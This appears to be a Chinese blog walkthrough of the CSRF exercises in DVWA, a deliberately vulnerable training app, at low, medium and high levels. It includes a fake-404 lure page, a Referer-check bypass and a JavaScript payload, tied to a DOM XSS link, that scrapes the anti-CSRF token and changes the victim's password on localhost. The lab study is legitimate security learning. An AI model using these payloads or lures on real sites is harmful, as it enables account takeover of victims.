### 使用短链接进行格式修改
[地址在这](http://tool.chinaz.com/tools/dwz.aspx)
### 构造攻击页面
在实际攻击中，攻击者可以利用自己构造的一个虚假页面让被攻击者点击来实现攻击操作。
        404
    Not Found
    The requested URL was not found on this server.
当被攻击者访问这个页面时，会出现假的404错误，被攻击者会认为自己进入了一个无效的网站，但实际上攻击已经产生了。
## medium难度
首先查看源码，发现比low多了一个判断
    if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {
            // Get input
            $pass_new  = $_GET[ 'password_new' ];
            $pass_conf = $_GET[ 'password_conf' ];
也就是说，Medium级的代码检查了保留变量
HTTP_REFERER(http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME这一个方法来抵御csrf攻击，但是这种方式只需要将刚才那个页面名字修改为本地IP地址就可。  
这里看到预期修改为password，点击页面后，回到原来页面，测试发现密码修改成功。  
## high难度
查看源码  
发现比起medium多了一个
    if( isset( $_GET[ 'Change' ] ) ) {
        // Check Anti-CSRF token
        checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
很明显high级的难度在防御机制中加入了token元素。即`用户每次访问改密页面时，服务器会返回一个随机的token。向服务器发起请求时，需要提交token参数。而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。`  
看了大佬博客之后发现可以构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而完成 CSRF 攻击。
    alert(document.cookie);
    var theUrl = 'http://127.0.0.1/DVWA/vulnerabilities/csrf/';
        if(window.XMLHttpRequest) {
            xmlhttp = new XMLHttpRequest();
        }else{
            xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
        }
    var count = 0;
        xmlhttp.withCredentials = true;
        xmlhttp.onreadystatechange=function(){
            if(xmlhttp.readyState ==4 && xmlhttp.status==200)
            {
                var text = xmlhttp.responseText;
                var regex = /user_token\' value\=\'(.*?)\' \/\>/;
                var match = text.match(regex);
                console.log(match);
                alert(match[1]);
                    var token = match[1];
                        var new_url = 'http://127.0.0.1/DVWA/vulnerabilities/csrf/?user_token='+token+'&password_new=password&password_conf=password&Change=Change';
                        if(count==0){
                            count++;
                            xmlhttp.open("GET",new_url,false);
                            xmlhttp.send();
                        }
            }
        };
        xmlhttp.open("GET",theUrl,false);
        xmlhttp.send();
将其放在攻击者的网络上，我由于是本地实验，所以放在了`http://127.0.0.1/xss.js`，然后心细的人发现了，这个应该是xss攻击吧？没错，看大佬博客使用的就是xss和csrf相结合的方法实现攻击的。  
然后构造payload：`http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=English
#`
然后诱导被攻击者点击这个链接实现攻击操作。  
但是自身实践出现错误，百度发现，现在的浏览器不允许跨域访问，所以求教了大师傅之后，发现了另一个方法，bp抓包，修改参数。看了团队内的大佬博客之后，知道可以利用``来实现token获取。  
在DVWA的xss页面，进行抓包  
修改参数  
之后进行放包。得到浏览器页面  
在这里修改密码  
然后构造一个自动点击的页面
然后诱导用户点击，  
修改成功。
# 后记
对于impossible难度暂时没有打算尝试，毕竟high难度还有点一知半解，等后期更加深入了解了之后再回来补充。